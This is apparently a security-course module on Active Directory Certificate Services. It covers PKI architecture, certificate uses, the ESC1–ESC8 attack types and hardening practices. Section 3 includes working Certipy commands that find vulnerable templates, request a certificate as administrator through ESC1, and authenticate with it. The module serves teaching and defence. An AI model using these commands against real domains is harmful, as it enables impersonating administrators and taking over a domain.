# Certificate Services

## Unit 6 - Topic 5 | Network Services Security

---

## Overview

**Certificate Services** provide the infrastructure for creating, managing, and revoking digital certificates within an organization. **Active Directory Certificate Services (AD CS)** is Microsoft's implementation. Certificate services are increasingly targeted by attackers for **privilege escalation**, **persistence**, and **impersonation** through certificate abuse.

---

## 1. Certificate Services Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│              CERTIFICATE SERVICES                                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐                                               │
│  │  ROOT CA      │  Offline, highly secured                     │
│  │  (Offline)    │  Signs subordinate CA certificates           │
│  └──────┬───────┘                                               │
│         │                                                        │
│  ┌──────┴───────┐                                               │
│  │ ISSUING CA    │  Online, issues certificates to users/devices│
│  │ (AD CS)       │  Integrated with Active Directory            │
│  └──────┬───────┘                                               │
│         │                                                        │
│    ┌────┴────┬────────┬──────────┐                              │
│    │         │        │          │                              │
│  ┌─┴──┐  ┌──┴──┐  ┌──┴──┐  ┌───┴───┐                         │
│  │User│  │ Web │  │ VPN │  │Device │  End-entity certs         │
│  │Cert│  │ SSL │  │ Cert│  │ Cert  │                           │
│  └────┘  └─────┘  └─────┘  └───────┘                          │
│                                                                  │
│  Certificate Templates define what certs can be issued          │
│  and who can request them.                                      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 2. Common Certificate Uses

| Use | Description |
|-----|-------------|
| **TLS/SSL** | Secure websites (HTTPS) |
| **Client Authentication** | Authenticate users/devices to services |
| **Code Signing** | Sign software to prove authenticity |
| **Email (S/MIME)** | Encrypt and sign emails |
| **VPN Authentication** | Certificate-based VPN access |
| **Wi-Fi (EAP-TLS)** | Certificate-based Wi-Fi authentication |
| **Smart Card Login** | Certificate on smart card for Windows login |

---

## 3. AD CS Attack Vectors (ESC Attacks)

| Attack | Name | Description |
|--------|------|-------------|
| **ESC1** | Template Misconfiguration | Template allows any user to specify SAN (Subject Alternative Name) → impersonate any user |
| **ESC4** | Template ACL Abuse | Attacker can modify certificate template → enable ESC1 |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag allows any SAN in requests |
| **ESC8** | NTLM Relay to AD CS | Relay NTLM auth to web enrollment → obtain certificate as victim |

```bash
# Certipy — AD CS enumeration and exploitation
certipy find -u user@corp.com -p 'password' -dc-ip 10.0.0.1

# Find vulnerable templates
certipy find -vulnerable -u user@corp.com -p 'password'

# ESC1 exploitation — request cert as admin
certipy req -u user@corp.com -p 'password' -ca CORP-CA \
  -template VulnerableTemplate -upn administrator@corp.com

# Authenticate with obtained certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

---

## 4. Certificate Security Best Practices

| Practice | Description |
|----------|-------------|
| **Audit Templates** | Review all certificate templates for dangerous permissions |
| **Restrict SAN** | Don't allow requesters to specify Subject Alternative Names |
| **Manager Approval** | Require approval for sensitive certificate types |
| **Monitor Issuance** | Log and alert on certificate requests/issuance |
| **Offline Root CA** | Keep Root CA offline — only used to sign subordinate CAs |
| **Short Validity** | Use shorter certificate lifetimes (90 days for web) |
| **CRL/OCSP** | Ensure revocation checking is working |
| **Protect CA** | Treat CA server as Tier 0 (same as Domain Controller) |

---

## 5. Certificate Lifecycle Management

```
REQUEST → VALIDATE → ISSUE → USE → MONITOR → RENEW/REVOKE → EXPIRE

Key management tasks:
• Automate renewal (ACME/Let's Encrypt for public, auto-enrollment for AD CS)
• Monitor for expiring certificates
• Maintain CRL/OCSP availability
• Rotate CA keys periodically
• Plan for CA compromise (revocation and reissuance)
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Certificate Services** | PKI infrastructure for managing digital certificates |
| **AD CS** | Microsoft's CA — integrated with Active Directory |
| **Top Threat** | Template misconfigurations (ESC1-ESC8) |
| **ESC1** | Allows impersonating any user via SAN specification |
| **Defense** | Audit templates, restrict SAN, protect CA as Tier 0 |

---

## Quick Revision Questions

1. **What is AD CS and what role does it play?**
2. **What is an ESC1 attack and why is it dangerous?**
3. **Why should the Root CA be kept offline?**
4. **What tool is used to enumerate AD CS vulnerabilities?**
5. **What certificate template settings should be audited?**

---

[← Previous: LDAP/Active Directory](04-ldap-active-directory.md)

---

*Unit 6 - Topic 5 of 5 | [Back to README](../README.md) | [Next Unit: Network Traffic Analysis →](../07-Network-Traffic-Analysis/01-packet-capture-basics.md)*
